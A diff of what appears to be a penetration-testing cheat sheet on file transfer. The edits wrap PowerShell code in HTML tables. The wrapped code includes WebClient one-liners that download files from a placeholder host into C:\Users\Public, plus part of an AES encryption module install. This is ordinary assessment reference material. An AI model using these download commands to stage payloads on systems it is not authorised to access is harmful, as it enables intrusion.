@@ -18,24 +18,69 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 **Destination Machine: Sync (Wait for the download to finish)**  
 
 No password
+<table>
+<tr>
+<td> 🔵 <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td>
+
 ```powershell
 (New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
 ```
+
+</td>
+</tr>
+</table>
+
 Using Credentials
+<table>
+<tr>
+<td> 🔵 <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td>
+
 ```powershell
 (New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
 
+</td>
+</tr>
+</table>
+
 **Destination Machine: Async (Keep using Powershell while downloading)**  
 
 No password
+<table>
+<tr>
+<td> 🔵 <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td>
+
 ```powershell
 (New-Object Net.WebClient).DownloadFileAsync('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
 ```
+
+</td>
+</tr>
+</table>
 Using Credentials
+<table>
+<tr>
+<td> 🔵 <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td>
+
 ```powershell
 (New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
@@ -829,6 +874,13 @@ Many different methods can be used to encrypt files and information on Windows s
 
 **Installation & Configuration**
 
+<table>
+<tr>
+<td> 🔵 <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td>
+
 ```powershell
 $moduleCode = @'
 function Invoke-AESEncryption {
@@ -939,6 +991,10 @@ $moduleCode | Out-File "$modulePath\AESCrypt.psm1" -Encoding utf8
 Import-Module AESCrypt -Force
 
 ```
+
+</td>
+</tr>
+</table>
 
 > **NOTE:**  To install globally (admin required), use the following route: **$modulePath = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt"**
 
